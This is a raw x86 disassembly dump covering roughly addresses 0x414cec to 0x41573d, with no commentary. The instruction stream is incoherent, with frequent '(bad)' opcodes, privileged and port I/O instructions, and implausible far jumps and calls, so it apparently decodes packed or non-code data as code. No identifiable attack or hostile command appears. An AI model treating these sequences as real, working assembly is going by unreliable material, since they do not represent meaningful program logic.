  414cec:	pop    edx
  414ced:	out    dx,eax
  414cee:	jns    0x414c7d
  414cf0:	dec    ebp
  414cf1:	imul   esp,DWORD PTR [ebp-0x2a8ddc97],0xffffff93
  414cf8:	ret    0x1804
  414cfb:	movaps XMMWORD PTR [ecx-0x7a],xmm5
  414cff:	jecxz  0x414d19
  414d01:	xor    ebp,DWORD PTR [esi-0x4f]
  414d04:	xchg   ebp,ebx
  414d06:	mov    al,ds:0x43b7b369
  414d0b:	xchg   edi,eax
  414d0c:	mov    dl,0x5f
  414d0e:	lahf   
  414d0f:	outs   dx,DWORD PTR ds:[esi]
  414d10:	call   0xf667bf2b
  414d15:	sbb    al,0x91
  414d17:	adc    eax,0xadbfd29a
  414d1c:	rol    DWORD PTR [ecx],0x1a
  414d1f:	in     eax,dx
  414d20:	xor    edx,ecx
  414d22:	test   eax,0x54efaf74
  414d27:	push   esp
  414d28:	js     0x414d39
  414d2a:	repnz and al,0xce
  414d2d:	fstp   QWORD PTR [esp+ecx*2-0x3f]
  414d31:	cmp    BYTE PTR [edx],0xe3
  414d34:	add    BYTE PTR [eax],0x6
  414d37:	aaa    
  414d38:	jns    0x414cdb
  414d3a:	ins    BYTE PTR es:[edi],dx
  414d3b:	push   cs
  414d3c:	jmp    0xfba2:0x74cd61e0
  414d43:	dec    edi
  414d44:	jmp    0x5e4256ea
  414d49:	mov    al,ds:0x200aee46
  414d4e:	mov    edi,0x376c783a
  414d53:	inc    edx
  414d54:	(bad)  
  414d56:	mov    eax,ds:0x190485a4
  414d5b:	or     ch,BYTE PTR [ebx]
  414d5d:	stos   DWORD PTR es:[edi],eax
  414d5e:	test   DWORD PTR [ebx-0x1e50c6c0],eax
  414d64:	dec    ebx
  414d65:	adc    al,0x90
  414d67:	jl     0x414dba
  414d69:	xor    eax,0xef8b83b6
  414d6e:	test   BYTE PTR [ebp-0x80ed65e],0x37
  414d75:	(bad)
  414d78:	xchg   esp,eax
  414d79:	lds    edi,FWORD PTR [edi]
  414d7b:	daa    
  414d7c:	sub    al,0x83
  414d7e:	cmp    al,0xd7
  414d80:	pop    edi
  414d81:	pop    edi
  414d82:	out    0x64,al
  414d84:	xchg   ebx,eax
  414d85:	jg     0x414db4
  414d87:	mov    dh,0xe1
  414d89:	xor    BYTE PTR [ebp-0x1c],dh
  414d8c:	mov    ah,0xfb
  414d8e:	push   esi
  414d8f:	outs   dx,BYTE PTR ds:[esi]
  414d90:	sub    al,0x0
	...
  414df2:	add    BYTE PTR [eax],al
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x3e2e544d
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x3e000001,al
  414e0d:	out    0x5d,al
  414e0f:	or     eax,eax
  414e11:	ja     0x414e84
  414e13:	push   esp
  414e14:	push   edx
  414e15:	xor    eax,0xb09812bf
  414e1a:	jo     0x414e47
  414e1c:	addr16 std 
  414e1e:	cli    
  414e1f:	add    BYTE PTR [ebx-0x52],dl
  414e22:	(bad)
  414e26:	xchg   BYTE PTR [eax],bl
  414e28:	mov    bl,0xc9
  414e2a:	adc    bl,cl
  414e2c:	addr16 pop es
  414e2e:	mov    ds:0x496b244,eax
  414e33:	nop
  414e34:	ret    
  414e35:	sti    
  414e36:	(bad)  
  414e37:	xor    edi,DWORD PTR [eax-0x6fae0ab]
  414e3d:	popa   
  414e3e:	sub    eax,0x99c69027
  414e43:	into   
  414e44:	sbb    DWORD PTR [esi-0x53d4c9f9],0xccf1bd1d
  414e4e:	sbb    bl,bh
  414e50:	inc    esi
  414e51:	fs clc 
  414e53:	clc    
  414e54:	(bad)  
  414e55:	repz ds popa 
  414e58:	adc    al,BYTE PTR [ebp+0x51b25d29]
  414e5e:	mov    ah,0xa0
  414e60:	sub    eax,0xe6e924e4
  414e65:	inc    ebp
  414e66:	jbe    0x414ebc
  414e68:	ins    BYTE PTR es:[edi],dx
  414e69:	test   DWORD PTR [ebp-0x3dc5e58],eax
  414e6f:	sbb    al,BYTE PTR [ebx]
  414e71:	sbb    BYTE PTR [esi-0xa69ce27],ah
  414e77:	das    
  414e78:	mov    WORD PTR [ebx],gs
  414e7a:	pop    ss
  414e7b:	xor    dh,BYTE PTR [edi]
  414e7d:	mov    WORD PTR [ecx],ds
  414e7f:	je     0x414e65
  414e81:	ins    DWORD PTR es:[edi],dx
  414e82:	fiadd  WORD PTR [edi+0x34f4f83d]
  414e88:	es pop eax
  414e8a:	ret    0xdc91
  414e8d:	dec    eax
  414e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e8f:	and    DWORD PTR [eax+ecx*8-0x1],eax
  414e93:	cwde   
  414e94:	jae    0x414e93
  414e96:	push   ecx
  414e97:	mov    eax,ds:0x422b2487
  414e9c:	jo     0x414e3e
  414e9e:	jno    0x414eb0
  414ea0:	and    eax,0x78552d52
  414ea5:	lds    esp,FWORD PTR [ebp+0x2a]
  414ea8:	add    BYTE PTR [ebx],ah
  414eaa:	mov    ah,0xa1
  414eac:	xor    eax,DWORD PTR [ecx]
  414eae:	out    0xdc,eax
  414eb0:	test   DWORD PTR [ebx-0x204796ba],esi
  414eb6:	clc    
  414eb7:	pop    ecx
  414eb8:	repz popf 
  414eba:	rcr    DWORD PTR [ecx+0x2],cl
  414ebd:	lock rol BYTE PTR [edi+0x14],cl
  414ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ec2:	jnp    0x414ed6
  414ec4:	rol    BYTE PTR [ebp+ecx*8+0x6d],cl
  414ec8:	push   eax
  414ec9:	inc    ebx
  414eca:	imul   ebx,ebp,0x8abab90a
  414ed0:	ret    
  414ed1:	(bad)  
  414ed2:	into   
  414ed3:	popf   
  414ed4:	fld    st(0)
  414ed6:	fld    QWORD PTR [eax]
  414ed8:	xor    al,0xb
  414eda:	jle    0x414f24
  414edc:	add    DWORD PTR [edi+0x2d],edi
  414edf:	aas    
  414ee0:	mov    al,0x61
  414ee2:	or     eax,0x104bea45
  414ee7:	in     al,dx
  414ee8:	dec    ebx
  414ee9:	cmp    al,0xc7
  414eeb:	and    BYTE PTR [edi+0x51ba5f23],0x14
  414ef2:	lea    eax,[eax+0x6d6ebd20]
  414ef8:	call   0x1c8995d4
  414efd:	pop    ecx
  414efe:	sbb    DWORD PTR [ecx+ebx*4+0x7ea62aa6],edi
  414f05:	push   cs
  414f06:	mul    eax
  414f08:	push   esi
  414f09:	ja     0x414f2f
  414f0b:	cwde   
  414f0c:	xchg   edx,eax
  414f0d:	push   ebp
  414f0e:	xor    eax,0x205
	...
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xa934cb53
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x20000001
  414f8d:	ret    
  414f8e:	mov    ch,0xf3
  414f90:	imul   ebp,DWORD PTR [edi-0x7c],0xae51fdc4
  414f97:	sub    DWORD PTR [edx],edi
  414f99:	icebp  
  414f9a:	push   esi
  414f9b:	js     0x414ff2
  414f9d:	pop    esi
  414f9e:	sub    DWORD PTR [edx],ecx
  414fa0:	imul   ecx,ebx,0xd56ad3c3
  414fa6:	mov    ecx,DWORD PTR [esi+0x17b49d92]
  414fac:	or     eax,0xb5e5cc6b
  414fb1:	and    cl,dh
  414fb3:	mov    al,0xd8
  414fb5:	xchg   esp,eax
  414fb6:	jno    0x41501a
  414fb8:	aaa    
  414fb9:	sbb    eax,0xc4363614
  414fbe:	daa    
  414fbf:	sbb    BYTE PTR [ebx],ah
  414fc1:	and    al,0xd3
  414fc3:	dec    edx
  414fc4:	jg     0x414f81
  414fc6:	stos   DWORD PTR es:[edi],eax
  414fc7:	xor    BYTE PTR [edi],dh
  414fc9:	mov    ch,0xcd
  414fcb:	mov    ecx,0x202da2da
  414fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd1:	mov    ebx,0x526a49cb
  414fd6:	sbb    esp,DWORD PTR [ebx+eax*4]
  414fd9:	dec    esp
  414fda:	cmp    cl,BYTE PTR [eax]
  414fdc:	jmp    0x87b8:0x806c16b6
  414fe3:	js     0x414fd9
  414fe5:	mov    DWORD PTR [esi-0x18],0xbd67a2d4
  414fec:	dec    edx
  414fed:	aaa    
  414fee:	test   esi,esi
  414ff0:	stos   DWORD PTR es:[edi],eax
  414ff1:	jbe    0x414f81
  414ff3:	push   es
  414ff4:	jb     0x414fea
  414ff6:	enter  0xcc47,0xb0
  414ffa:	adc    ebx,DWORD PTR [edi-0x37]
  414ffd:	xor    DWORD PTR [ebx-0x79],ecx
  415000:	(bad)  
  415002:	(bad)  
  415004:	pushf  
  415005:	sbb    al,0x19
  415007:	inc    ebx
  415008:	inc    esp
  415009:	inc    ebx
  41500a:	xlat   BYTE PTR ds:[ebx]
  41500b:	adc    al,0xd1
  41500d:	je     0x414fcc
  41500f:	mov    BYTE PTR [ecx],bh
  415011:	arpl   bp,si
  415013:	hlt    
  415014:	das    
  415015:	cwde   
  415016:	push   ds
  415017:	add    DWORD PTR [edx+edi*8+0x11e15874],ecx
  41501e:	jno    0x415072
  415020:	lods   al,BYTE PTR ds:[esi]
  415021:	cmp    ebx,DWORD PTR [ecx]
  415023:	retf   
  415024:	test   BYTE PTR [ebx+0x5f6f119d],al
  41502a:	shl    DWORD PTR [ebp+0x60ce8706],cl
  415030:	sub    BYTE PTR [edi+ecx*2-0x20],ch
  415034:	shl    BYTE PTR [ecx],0x3b
  415037:	adc    al,0xe3
  415039:	and    ebx,esi
  41503b:	sub    BYTE PTR [ecx-0x31],cl
  41503e:	scas   al,BYTE PTR es:[edi]
  41503f:	dec    ebp
  415040:	stc    
  415041:	mov    DWORD PTR [ecx+0x25072e1d],edi
  415047:	xchg   esi,eax
  415048:	jge    0x4150c9
  41504a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41504b:	idiv   ecx
  41504d:	sub    esi,ecx
  41504f:	jl     0x4150c0
  415051:	pop    ecx
  415052:	add    al,0x14
  415055:	test   al,0xb
  415057:	xchg   ecx,eax
  415058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415059:	inc    esp
  41505a:	cmp    al,0x53
  41505c:	sbb    DWORD PTR [eax],esp
  41505e:	pop    ebp
  41505f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415060:	leave  
  415061:	pop    es
  415062:	xor    DWORD PTR [eax-0x5a],esp
  415065:	in     al,dx
  415066:	enter  0x5b29,0x2f
  41506a:	adc    edi,DWORD PTR [edx-0x630aa0c7]
  415070:	sub    edx,esi
  415072:	(bad)  [ebx-0x3d]
  415075:	mov    eax,0x57ef7386
  41507a:	fisub  DWORD PTR [ecx+edi*8+0x77]
  41507e:	jg     0x415033
  415080:	ins    DWORD PTR es:[edi],dx
  415081:	mov    dl,0x32
  415083:	sbb    ebp,DWORD PTR [esi+0x4]
  415086:	fcmovnb st,st(0)
  415088:	leave  
  415089:	rcr    DWORD PTR [ecx+0x51],0x37
  41508d:	jle    0x4150c1
  41508f:	fwait
  415090:	mov    DWORD PTR [eax],eax
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xf785fc2d
  415102:	lods   eax,DWORD PTR ds:[esi]
  415103:	(bad)  
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0x52000001
  41510d:	sub    DWORD PTR [esi+0x65],esp
  415110:	stos   BYTE PTR es:[edi],al
  415111:	xor    al,0x8e
  415113:	mov    esp,0xc3a0e319
  415118:	cld    
  415119:	cmp    al,BYTE PTR [ebx-0x76]
  41511c:	xchg   esi,eax
  41511d:	mov    bl,0xc3
  41511f:	pushf  
  415120:	retf   0x14ca
  415123:	add    eax,0x58ab13b5
  415128:	sub    ebp,DWORD PTR [edx+0x39]
  41512b:	and    eax,DWORD PTR [esi]
  41512d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41512e:	jno    0x415184
  415130:	add    eax,0x88631ffa
  415135:	pop    esi
  415136:	lea    eax,[edx+0x766a3d5c]
  41513c:	sbb    ebp,eax
  41513e:	les    eax,FWORD PTR [edx-0x7ba223c4]
  415144:	push   cs
  415145:	add    BYTE PTR [edi],dl
  415147:	aam    0xb2
  415149:	cmp    eax,0xdca8f5e6
  41514e:	dec    esp
  41514f:	xchg   edx,eax
  415150:	cwde   
  415151:	shr    DWORD PTR [edi-0x26],cl
  415154:	fcmovb st,st(1)
  415156:	in     al,0xa4
  415158:	lock sub al,0xe3
  41515b:	fwait
  41515c:	lods   al,BYTE PTR ds:[esi]
  41515d:	fdivp  st(7),st
  41515f:	(bad)
  415162:	pop    ebp
  415163:	cmp    cl,al
  415165:	outs   dx,BYTE PTR ds:[esi]
  415166:	xor    DWORD PTR [esi+0x1ebcd79f],0xffffff86
  41516d:	push   ebp
  41516e:	addr16 call 0x74bb2ebb
  415174:	ror    DWORD PTR [ecx],cl
  415176:	fwait
  415177:	push   cs
  415178:	les    edx,FWORD PTR [esp+ebp*2+0xb5dea73]
  41517f:	jg     0x4151f6
  415181:	mov    dl,0xb5
  415183:	adc    BYTE PTR [edx-0x44],ch
  415186:	lds    edi,FWORD PTR [edx]
  415188:	inc    edx
  415189:	lea    edi,[ebp+0x4a5b9200]
  41518f:	gs push ebp
  415191:	adc    BYTE PTR [edx-0x42],0x52
  415195:	push   cs
  415196:	xchg   BYTE PTR [edx-0x44],ah
  415199:	(bad)  
  41519b:	test   al,0xa2
  41519d:	jmp    0x415140
  41519f:	repnz mov ds:0xa9624737,al
  4151a5:	jnp    0x41512c
  4151a7:	lods   al,BYTE PTR ds:[esi]
  4151a8:	std    
  4151a9:	rol    BYTE PTR [ebp+0x63],1
  4151ac:	mov    ebp,0xd4c14918
  4151b1:	sub    esp,DWORD PTR [edx]
  4151b3:	mov    eax,0x67e1d148
  4151b8:	out    0x21,eax
  4151ba:	aas    
  4151bb:	cmp    esp,edi
  4151bd:	add    DWORD PTR ds:0xd804a87d,edi
  4151c3:	cld    
  4151c4:	and    al,0xfc
  4151c6:	(bad)
  4151ca:	aaa    
  4151cb:	clc    
  4151cc:	je     0x4151f4
  4151ce:	stc    
  4151cf:	inc    ebx
  4151d0:	pop    ds
  4151d1:	mov    dh,0xec
  4151d3:	mov    al,ds:0xad26f4fb
  4151d8:	rcl    edx,1
  4151da:	pop    esi
  4151db:	xchg   ebx,eax
  4151dc:	shl    BYTE PTR [ebp-0x6b],1
  4151df:	jl     0x4151e1
  4151e1:	cmc    
  4151e2:	cld    
  4151e3:	xchg   BYTE PTR [esi],ch
  4151e5:	xchg   ecx,eax
  4151e6:	inc    esi
  4151e7:	pop    esi
  4151e8:	cs mov edi,0xb89a5f6d
  4151ee:	jbe    0x415198
  4151f0:	inc    ecx
  4151f1:	push   eax
  4151f2:	loope  0x41526f
  4151f4:	mov    DWORD PTR [edx-0x73],esp
  4151f7:	jns    0x415227
  4151f9:	cmp    BYTE PTR [di-0x2156],0x48
  4151ff:	scas   eax,DWORD PTR es:[edi]
  415200:	fadd   DWORD PTR [ecx+eiz*8]
  415203:	jge    0x41523a
  415205:	bound  ecx,QWORD PTR [esi]
  415207:	mov    dl,0xd8
  415209:	sti    
  41520a:	pusha  
  41520b:	adc    al,0xba
  41520d:	(bad)  
  41520f:	fs popf 
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x8aeb110b
  415283:	in     eax,dx
  415284:	sbb    eax,0x50000df
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    BYTE PTR [edi+0x4a2b7512],bl
  415291:	mov    DWORD PTR [edx+0x72abdf77],0xced19e70
  41529b:	dec    ebp
  41529c:	xchg   esp,eax
  41529d:	mov    ebp,0x11be5b66
  4152a2:	js     0x415283
  4152a4:	add    edx,DWORD PTR [ebp-0x2c]
  4152a7:	inc    ecx
  4152a8:	lock lahf 
  4152aa:	pop    esi
  4152ab:	add    ecx,ebx
  4152ad:	and    BYTE PTR [ecx+0x5c05f3f2],ch
  4152b3:	cmp    DWORD PTR [eax],edi
  4152b5:	clc    
  4152b6:	icebp  
  4152b7:	xchg   edx,eax
  4152b8:	outs   dx,BYTE PTR ds:[esi]
  4152b9:	out    dx,eax
  4152ba:	cmp    BYTE PTR [ebp+0x5a],ah
  4152bd:	jp     0x415302
  4152bf:	xchg   edx,eax
  4152c0:	jne    0x415288
  4152c2:	mov    eax,0xbbac0872
  4152c7:	xchg   ebx,eax
  4152c8:	outs   dx,BYTE PTR ds:[esi]
  4152c9:	fs gs cli 
  4152cc:	or     DWORD PTR [ecx+0x70a32dfe],ebp
  4152d2:	fnstsw WORD PTR [esi+0x26]
  4152d5:	ja     0x4152d1
  4152d7:	mov    ds:0x31b5bff,eax
  4152dc:	mov    eax,ds:0x245bfe03
  4152e1:	fs dec ebp
  4152e3:	mov    ch,0x9f
  4152e5:	pusha  
  4152e6:	int    0xd7
  4152e8:	push   eax
  4152e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152ea:	das    
  4152eb:	cdq    
  4152ec:	ins    DWORD PTR es:[edi],dx
  4152ed:	adc    eax,DWORD PTR [ecx]
  4152ef:	add    DWORD PTR [ebp+0x1b76d03c],ecx
  4152f5:	sti    
  4152f6:	or     DWORD PTR [ecx-0x4],edx
  4152f9:	pop    esp
  4152fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152fb:	je     0x415322
  4152fd:	mov    eax,0x498bd3cf
  415302:	(bad)  
  415303:	fcomp  DWORD PTR [esi+0x1b]
  415306:	(bad)  [ecx]
  415308:	cmp    esp,DWORD PTR [edi-0x75]
  41530b:	and    DWORD PTR [eax],esp
  41530d:	jb     0x4152f2
  41530f:	iret   
  415310:	call   0xbca9d479
  415315:	outs   dx,BYTE PTR ds:[esi]
  415316:	adc    al,dh
  415318:	xor    BYTE PTR [ecx],bl
  41531a:	jne    0x41536f
  41531c:	jne    0x4152b6
  41531e:	pushf  
  41531f:	shl    BYTE PTR [esi+edx*2-0x642b95f1],1
  415326:	add    BYTE PTR [esp+eax*1-0x4],bl
  41532a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41532b:	jnp    0x415364
  41532d:	mov    ebx,0x7ec3373a
  415332:	fdivp  st(0),st
  415334:	pop    ds
  415335:	and    DWORD PTR [ebp-0x58],esi
  415338:	and    al,0xb6
  41533a:	xor    edx,DWORD PTR [eax]
  41533c:	ss jecxz 0x415352
  41533f:	adc    al,dl
  415341:	(bad)  
  415343:	ret    
  415344:	push   0xa2808640
  415349:	or     al,0x2e
  41534b:	jb     0x41535d
  41534d:	adc    bh,BYTE PTR [edi+0x41e1d8fa]
  415353:	sbb    BYTE PTR [eax+0x55],0xdd
  415357:	xchg   esp,eax
  415358:	js     0x415312
  41535a:	pusha  
  41535b:	sbb    ecx,ebp
  41535d:	les    edx,FWORD PTR [ecx]
  41535f:	mov    al,0x7c
  415361:	outs   dx,DWORD PTR ds:[esi]
  415362:	pop    es
  415363:	add    eax,DWORD PTR [ecx+0x25]
  415366:	int3   
  415367:	addr16 xchg ebp,eax
  415369:	jne    0x415362
  41536b:	in     ax,0x77
  41536e:	push   cs
  41536f:	dec    ecx
  415370:	pusha  
  415371:	sub    ch,BYTE PTR [edi]
  415373:	hlt    
  415374:	(bad)  
  415375:	or     al,0xba
  415377:	mov    cl,0xc0
  415379:	lods   eax,DWORD PTR ds:[esi]
  41537a:	cmp    esp,0xffffffe8
  41537d:	dec    ecx
  41537e:	pop    esi
  41537f:	add    al,0x18
  415381:	adc    DWORD PTR [esi],edi
  415383:	stos   BYTE PTR es:[edi],al
  415384:	jg     0x4153b7
  415386:	xor    eax,0x877558d5
  41538b:	cdq    
  41538c:	imul   edi,ecx,0xac14e1
	...
  4153f2:	add    BYTE PTR [eax],al
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x5fd3e5b0
  415401:	cmp    ebx,eax
  415403:	fldenv [edx]
  415405:	loopne 0x415407
  415407:	add    BYTE PTR ds:0x78000001,al
  41540d:	push   cs
  41540e:	cmp    cl,BYTE PTR [eax+0x69fed66]
  415414:	(bad)  
  415416:	pop    eax
  415417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415418:	pop    edi
  415419:	cmp    BYTE PTR [ebp-0x69],dh
  41541c:	mov    bh,0xb2
  41541e:	jae    0x41549c
  415420:	jbe    0x4153bd
  415422:	pop    ds
  415423:	lea    eax,[edx+0x35]
  415426:	fsub   DWORD PTR [edx-0x34]
  415429:	xchg   ebx,eax
  41542a:	pop    es
  41542b:	(bad)  
  41542d:	imul   ebp,ecx,0xffffffb2
  415430:	(bad)  [ebx+0x6f178c36]
  415436:	jle    0x415421
  415438:	inc    ebx
  415439:	xchg   esi,eax
  41543a:	inc    eax
  41543b:	mov    dl,0x7b
  41543d:	jecxz  0x415439
  41543f:	or     edi,DWORD PTR [edi]
  415441:	mov    al,ds:0xc15afff
  415446:	jne    0x41545c
  415448:	js     0x4154a9
  41544a:	cli    
  41544b:	adc    eax,0xbcdf890b
  415450:	push   esp
  415451:	cmp    edi,DWORD PTR [ebx-0x547b14c5]
  415457:	mov    cr4,ebx
  41545a:	and    DWORD PTR [ebx+0x1b],ebx
  41545d:	iret   
  41545e:	test   DWORD PTR [ebp+0x247b41e0],esi
  415464:	cmp    bl,BYTE PTR [eax+0x5740b5c8]
  41546a:	fwait
  41546b:	mov    dh,0xe6
  41546d:	cmp    eax,0x1ba31241
  415472:	adc    bl,BYTE PTR [eax+0x61b11411]
  415478:	ret    0xd319
  41547b:	out    0x2f,al
  41547d:	or     dl,bh
  41547f:	sub    DWORD PTR [ecx-0x214c22ae],eax
  415485:	mov    ah,0x9d
  415487:	push   ecx
  415488:	inc    esi
  415489:	gs xchg esi,eax
  41548b:	pop    es
  41548c:	fld    st(2)
  41548e:	dec    eax
  41548f:	sar    DWORD PTR [esi-0x7f],1
  415492:	and    eax,0x1a4053d6
  415497:	sub    al,0x35
  415499:	retf   
  41549a:	push   esi
  41549b:	retf   
  41549c:	(bad)  
  41549d:	(bad)  
  41549e:	push   cs
  41549f:	pop    ss
  4154a0:	mov    eax,0xc632a3a1
  4154a5:	xor    al,0xcc
  4154a7:	cli    
  4154a8:	pop    esp
  4154a9:	push   esi
  4154aa:	xor    ah,BYTE PTR [esi+0x4382fe6e]
  4154b0:	and    BYTE PTR [eax-0x37],al
  4154b3:	mov    esp,0xc552ad3e
  4154b8:	ror    ecx,1
  4154ba:	push   esp
  4154bb:	xchg   edx,eax
  4154bc:	lods   eax,DWORD PTR ds:[esi]
  4154bd:	lahf   
  4154be:	sub    eax,0xffffffc4
  4154c1:	xor    eax,0xc15469db
  4154c6:	es scas eax,DWORD PTR es:[edi]
  4154c8:	wbinvd 
  4154ca:	fs and al,0x2f
  4154cd:	mov    bh,0x7d
  4154cf:	repnz imul DWORD PTR [ecx]
  4154d2:	hlt    
  4154d3:	test   eax,0x9a730cdc
  4154d8:	adc    bl,0x7b
  4154db:	(bad)  
  4154dc:	jle    0x415517
  4154de:	jno    0x4154f6
  4154e0:	stos   BYTE PTR es:[edi],al
  4154e1:	aas    
  4154e2:	test   BYTE PTR [ebx],ah
  4154e4:	fcomp  QWORD PTR [esi+0x5855fbf9]
  4154ea:	(bad)  
  4154eb:	es int3 
  4154ed:	push   edi
  4154ee:	ins    DWORD PTR es:[edi],dx
  4154ef:	mov    dh,0x1a
  4154f1:	xchg   ebp,eax
  4154f2:	mov    bl,0x62
  4154f4:	pop    ebx
  4154f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154f6:	mov    dl,0x17
  4154f8:	jmp    0x41556e
  4154fa:	in     eax,0xb8
  4154fc:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4154fe:	xchg   DWORD PTR [ebx+0xd],ecx
  415501:	inc    ebp
  415502:	cs pop ds
  415504:	xor    al,ch
  415506:	mov    bl,0xe7
  415508:	scas   al,BYTE PTR es:[edi]
  415509:	and    BYTE PTR [edx-0xc2178c7],al
  41550f:	mov    ds:0x27,al
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415525
  415581:	ret    0x3958
  415584:	daa    
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0xa5000001,al
  41558d:	xor    ebp,ecx
  41558f:	js     0x41553e
  415591:	dec    edx
  415592:	adc    edx,DWORD PTR [eax]
  415594:	mov    dl,BYTE PTR [edx+0x6c64cff6]
  41559a:	imul   ebx,DWORD PTR [esi],0x4de86e15
  4155a0:	nop
  4155a1:	(bad)  
  4155a2:	xchg   ebp,eax
  4155a3:	das    
  4155a4:	std    
  4155a5:	stos   DWORD PTR es:[edi],eax
  4155a6:	sahf   
  4155a7:	ret    0x11eb
  4155aa:	push   esp
  4155ab:	inc    esi
  4155ac:	ja     0x415567
  4155ae:	daa    
  4155af:	mov    ch,0xf3
  4155b1:	popf   
  4155b2:	icebp  
  4155b3:	aad    0x26
  4155b5:	push   es
  4155b6:	sub    BYTE PTR [ebp-0x475534c0],al
  4155bc:	mov    ds:0x7646d71d,al
  4155c1:	dec    esi
  4155c2:	enter  0x931c,0xe8
  4155c6:	xchg   edx,ebp
  4155c8:	dec    esp
  4155c9:	pop    ds
  4155ca:	dec    ebx
  4155cb:	std    
  4155cc:	sub    al,0xbc
  4155ce:	int    0xc1
  4155d0:	xchg   DWORD PTR [ecx+0x47],esp
  4155d3:	adc    eax,0xff55dd81
  4155d8:	pop    ebx
  4155d9:	hlt    
  4155da:	enter  0x353a,0x1
  4155de:	mov    eax,ds:0x64a92508
  4155e3:	xchg   esi,eax
  4155e4:	mov    al,ds:0x9e1a79ed
  4155e9:	mov    ecx,0x98dc0916
  4155ee:	mov    al,ds:0x81dac256
  4155f3:	add    esp,ebp
  4155f5:	(bad)  
  4155f7:	and    BYTE PTR [eax],ch
  4155f9:	imul   edx,DWORD PTR [ecx-0x43],0xffffffb4
  4155fd:	mov    ah,0xcf
  4155ff:	fdivr  st,st(5)
  415601:	inc    edi
  415602:	enter  0x8d22,0xca
  415606:	mov    al,ds:0x269b1062
  41560b:	push   0x1
  41560d:	push   ds
  41560e:	dec    ebx
  41560f:	pop    ds
  415610:	and    BYTE PTR [esi],cl
  415612:	data16 jno 0x4155ee
  415615:	sbb    al,0x1f
  415617:	adc    BYTE PTR [ecx+0xd3fc633],al
  41561d:	sbb    al,0x60
  41561f:	push   0x61
  415621:	std    
  415622:	jb     0x415633
  415624:	addr16 icebp 
  415626:	shl    BYTE PTR [edx+0x327038e2],cl
  41562c:	aas    
  41562d:	cli    
  41562e:	mov    ebx,0xea3a9039
  415633:	xchg   edi,eax
  415634:	(bad)
  415637:	cmp    eax,DWORD PTR [eax+edi*8+0x40ea9d74]
  41563e:	sbb    ecx,0xd312fe87
  415644:	mov    dh,0x6d
  415646:	(bad)  
  415647:	sahf   
  415648:	cmc    
  415649:	jnp    0x4155e0
  41564b:	or     ecx,eax
  41564d:	mov    BYTE PTR [esi+0x7f8015b8],cl
  415653:	mov    bh,0xd
  415655:	mov    ecx,0xff01b84a
  41565a:	test   ecx,esp
  41565c:	mov    ch,0xbf
  41565e:	outs   dx,BYTE PTR ds:[esi]
  41565f:	mov    ebp,0x2bfe3813
  415664:	and    eax,0x90dc2b72
  415669:	dec    ebx
  41566a:	push   es
  41566b:	xchg   ebx,eax
  41566c:	call   0xbec5fc6a
  415671:	sbb    eax,0x50253003
  415676:	xor    eax,0x8296af7c
  41567b:	and    BYTE PTR [edi],bh
  41567d:	imul   esp,DWORD PTR [esi],0xffffffc3
  415680:	pop    ds
  415681:	loop   0x41569e
  415683:	push   0x3b2f5aa5
  415688:	fucom  st(2)
  41568a:	jmp    0x186e:0x9783fef8
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	add    DWORD PTR [edi-0x68],0xffffffbc
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x3d000001
  41570d:	pusha  
  41570e:	inc    eax
  41570f:	cmp    cl,ah
  415711:	stos   BYTE PTR es:[edi],al
  415712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415713:	std    
  415714:	adc    al,0xd5
  415716:	pop    ebx
  415717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415718:	pop    ebx
  415719:	push   ds
  41571a:	out    dx,eax
  41571b:	xor    DWORD PTR [esi+0x70],edx
  41571e:	call   0x73f7:0x686ddc14
  415725:	retf   0xb10
  415728:	js     0x415795
  41572a:	cs push edx
  41572c:	ds xchg ebx,eax
  41572e:	push   0x48dff66e
  415733:	or     DWORD PTR [ecx],esp
  415735:	(bad)  
  415736:	jno    0x41579f
  415738:	(bad)  
  415739:	mov    BYTE PTR [edi+ecx*1-0x8],al
  41573d:	daa    
